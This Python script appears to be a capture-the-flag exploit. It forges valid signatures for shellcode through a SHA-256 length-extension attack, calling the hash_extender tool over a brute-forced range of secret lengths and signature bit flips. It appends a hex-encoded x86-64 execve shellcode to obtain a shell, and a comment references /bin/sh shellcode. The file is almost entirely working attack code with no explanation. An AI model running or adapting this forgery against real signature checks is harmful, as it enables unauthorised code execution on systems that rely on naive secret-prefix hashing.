#!/usr/bin/env python3

import os
import hashlib
import binascii

# use /bin/sh and rcx to generate valid shellcode
# valid_shellcode = '48b92f62696e2f73680a5148c7c7010000004889e648c7c20800000048c7c0010000000f054801c9c8c029ec514a77e0c2da449077bf9e6a3f369176166038eb7174bc0d86d5f796'

sig_len = len(binascii.hexlify(hashlib.sha256(b'').digest()))


# generated by crack.py
append = '4889e748c7c60000000048c7c20000000048c7c03b0000000f05'


def generate_forged(valid_shellcode: str) -> list:
    print(valid_shellcode)
    signature = valid_shellcode[-sig_len:]
    data = valid_shellcode[:-sig_len]

    forged_codes = []
    for last_byte_xor in range(16):
        real_sig = signature[:-1] + \
            str(int(signature[-1], base=16) ^ last_byte_xor)
        for secret_len in range(32, 64):
            # print('to execute: ', "./hash_extender --data %s --secret %d --append %s --signature %s --format sha256" %
            #   (data, secret_len, append, real_sig))
            forged_hash = os.popen(
                "./hash_extender --data %s --data-format=hex --secret %d --append %s --signature %s --format sha256" % (data, secret_len, append, real_sig)).readlines()

            new_signature = forged_hash[2][15:-1]
            assert(len(signature) == sig_len)
            new_content = forged_hash[3][13:-1]

            new_payload = new_signature[:-1] + \
                str(int(new_signature[-1], base=16) ^ last_byte_xor)
            forged_codes.append(new_payload)

            # print('try this one! No.%d of 512 total, secret_len=%d, last_byte_xor=%d' %
            #       (secret_len - 31 + last_byte_xor * 32, secret_len, last_byte_xor))
            # print(new_content + new_signature_fixed)
            # input()
    return forged_codes